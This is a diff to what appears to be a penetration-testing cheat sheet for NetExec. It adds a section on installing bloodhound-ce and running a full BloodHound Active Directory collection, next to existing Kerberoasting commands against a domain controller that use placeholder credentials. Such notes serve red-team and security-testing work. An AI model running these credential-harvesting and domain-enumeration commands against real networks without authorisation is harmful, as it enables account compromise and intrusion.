@@ -479,6 +479,17 @@ nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_kerberoast.txt
 nxc ldap <DC_FQDN> -u <USER> -p '<PASSWORD>' --kerberoasting nxc_targeted_kerberoast.txt --kerberoast-account <TARGET_USER>
 ```
 
+### BloodHound-CE-Python via `netexec`
+
+- https://github.com/dirkjanm/BloodHound.py/tree/bloodhound
+
+```bash
+sudo pip install bloodhound-ce --break-system-packages
+sudo pip uninstall -y bloodhound --break-system-packages
+
+nxc ldap <DC> -d <DOMAIN> -u <USER> -p <PASS> --dns-server <DC_IP> --bloodhound --collection All
+```
+
 ## MSSQL
 
 **NOTE:** this [protocol has file operations --get-file and --put-file functions as well](#uploading-and-getting-files)
